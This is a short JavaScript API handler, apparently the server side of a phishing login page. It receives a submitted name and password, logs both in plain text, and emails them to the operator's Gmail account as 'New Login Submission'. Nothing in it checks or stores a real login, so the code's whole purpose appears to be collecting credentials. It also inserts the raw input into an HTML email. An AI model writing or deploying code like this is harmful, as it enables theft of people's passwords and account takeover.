export default async function handler(req, res) {
  await runMiddleware(req, res, corsMiddleware);
  console.log('API /api/sendMail called with method:', req.method);

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { name, password } = req.body;
  console.log('Received name:', name);
  console.log('Received password:', password);

  const sanitizedName = typeof name === 'string' ? name.trim() : '';
  const sanitizedPassword = typeof password === 'string' ? password.trim() : '';

  console.log('Sanitized name:', sanitizedName);
  console.log('Sanitized password:', sanitizedPassword);

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: 'New Login Submission',
      text: `New login details:\nName: ${sanitizedName}\nPassword: ${sanitizedPassword}`,
      html: `<h3>New Login Submission</h3><p><strong>Name:</strong> ${sanitizedName}</p><p><strong>Password:</strong> ${sanitizedPassword}</p>`,
    };

    await transporter.sendMail(mailOptions);
    return res.status(200).json({ message: 'Login details sent successfully' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to send email', error: error.message });
  }
}
